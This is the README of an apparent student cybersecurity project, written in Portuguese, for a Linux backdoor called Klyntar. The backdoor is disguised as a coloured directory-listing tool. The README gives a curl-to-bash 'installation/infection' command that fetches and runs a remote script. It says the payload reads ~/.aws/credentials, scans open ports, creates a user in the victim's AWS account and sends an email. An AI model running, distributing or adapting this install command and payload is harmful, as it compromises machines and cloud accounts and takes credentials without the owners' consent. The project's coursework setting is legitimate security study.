<!-- PROJECT LOGO -->

<p align="center">
    <img src="doc/images/venom_0c44_360x640.jpg" alt="Logo" width="230" height="400">
  <p align="center">
    Trabalho da disciplina de Cybersecurity para criação de um vírus que explora vulnerabilidade de credenciais mal configuradas em servidores AWS EC2. 
  </p>
</p>

## O desafio! 

Elaborar um vírus da categoria back door que possibilite a execução remota de ações no sistema operacional hospedeiro (Linux).

## O disfarce

O programa se disfarça como uma simples ferramenta de linha de comando para mostrar os diretórios de forma colorida no terminal :smile:.

## Porque Klyntar?

O simbionte Venom personagem da Marvel nem sempre foi o inimigo do Homem-Aranha ou um item de seu guarda-roupa. Sua origem está associada a um longínquo planeta na galáxia de Andrômeda, chamado *Klyntar*. Venom é um membro de uma raça alienígena de simbiontes que recebem o mesmo nome de seu planeta natal.

## Instalação/Infecção

``` bash
curl -L https://raw.githubusercontent.com/gabriel-dantas98/klyntar/master/install.sh | bash
```

## Por trás dos panos 

 - Verifica se existe ~/.aws/credentials;
 - Scaneia todas as portas que estão abertas no host;
 - Cria uma usuário na conta que a instância tem permissão;
 - Cria uma mensagem e envia por e-mail;
